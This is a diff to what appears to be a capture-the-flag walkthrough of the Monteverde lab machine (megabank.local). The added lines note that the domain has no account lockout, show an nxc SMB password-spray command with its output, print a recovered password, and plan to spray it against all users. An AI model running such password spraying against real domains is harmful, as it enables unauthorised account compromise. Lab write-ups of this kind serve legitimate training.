@@ -105,6 +105,8 @@ AS-REP roasting gave me no results!
 
 # Password spray leads to user compromise
 
+There is no lockout set on this domain! So i can perfom
+
 ```python
 nxc smb monteverde.megabank.local -u users.txt -p users.txt --continue-on-success
 SMB         10.129.35.54    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
@@ -206,5 +208,8 @@ cat azure.xml
 ```
 Looks like ive found a password!
 
+```python
+4n0therD4y@n0th3r$
 ```
-```
+I can spray this password against all the users!
+
